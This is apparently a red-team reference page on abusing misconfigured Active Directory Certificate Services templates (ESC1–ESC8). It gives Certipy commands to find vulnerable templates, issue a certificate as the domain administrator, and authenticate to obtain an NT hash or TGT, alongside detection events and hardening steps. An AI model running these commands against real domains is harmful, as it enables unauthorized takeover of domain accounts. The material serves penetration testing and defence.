---
title: "AD CS – ESC1-ESC8"
category: "red-team"
tags: ["active-directory", "adcs", "certificates", "privesc"]
platform: "windows"
mitre: ["T1649"]
difficulty: "advanced"
updated: "2026-07-11"
author: "core"
---

# AD CS Abuse (ESC1–ESC8)

## TL;DR
Misconfigured certificate templates in Active Directory Certificate Services let you issue a certificate impersonating any user (including Domain Admin) → Kerberos authentication as the victim. `Certipy` enumerates and exploits them.

## Enumeration
```bash
certipy find -u user@corp.local -p 'Pass' -dc-ip 10.10.10.10 -vulnerable -stdout
```

## Technique overview
```text
ESC1  – template: ENROLLEE_SUPPLIES_SUBJECT + client auth + enroll for user -> SAN = any user
ESC2  – Any Purpose EKU
ESC3  – Enrollment Agent -> request on behalf of others
ESC4  – write (WriteDacl) on the template -> turn it into ESC1
ESC6  – CA flag EDITF_ATTRIBUTESUBJECTALTNAME2 -> SAN in any request
ESC8  – NTLM relay to the web enrollment (HTTP) CA
```

## ESC1 example
```bash
# Issue a cert as administrator using the vulnerable template
certipy req -u user@corp.local -p 'Pass' -ca CORP-CA -template VulnTemplate \
  -upn administrator@corp.local -dc-ip 10.10.10.10

# Authenticate with the cert -> NT hash / TGT
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.10
```

## Detection (Blue Team)
- Event **4886/4887** (cert request/issuance) with SAN ≠ requester.
- Certificates with an admin UPN issued to low-priv users.
- Monitoring writes to templates (objects under `CN=Certificate Templates`).

## Mitigation / Hardening
- Remove `ENROLLEE_SUPPLIES_SUBJECT` where unneeded; restrict enroll rights.
- Disable `EDITF_ATTRIBUTESUBJECTALTNAME2` on the CA.
- Enforce manager approval on sensitive templates; HTTPS + EPA for web enrollment (ESC8).

## Sources
- [Certipy](https://github.com/ly4k/Certipy) · [SpecterOps – Certified Pre-Owned](https://posts.specterops.io/certified-pre-owned-d95910965cd2)
